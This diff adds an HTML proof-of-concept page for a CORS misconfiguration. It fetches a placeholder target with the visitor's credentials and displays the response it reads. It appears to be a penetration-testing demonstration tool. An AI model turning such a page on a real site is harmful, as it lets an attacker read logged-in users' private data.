@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS PoC</title>
+    <style>
+        #response {
+            width: 100%;
+            height: 200px;
+            box-sizing: border-box;
+            font-family: monospace;
+            white-space: pre-wrap;
+            overflow: auto;
+        }
+    </style>
+</head>
+<body>
+    <h1>CORS Proof-of-Concept</h1>
+    <button id="fetchData">Fetch!</button>
+    <br><br><textarea id="response" readonly></textarea>
+
+    <script>
+        document.getElementById('fetchData').addEventListener('click', () => {
+            var targetUrl = "https://target.com";
+            fetch(targetUrl, {
+                method: 'GET',
+                credentials: 'include'
+            })
+            .then(response => {
+                if (response.ok) {
+                    return response.text();
+                }
+                throw new Error('Response received is not as expected.');
+            })
+            .then(data => {
+                document.getElementById('response').value = data;
+            })
+            .catch(error => {
+                document.getElementById('response').value = `Error: ${error.message}`;
+            });
+        });
+    </script>
+</body>
+</html>
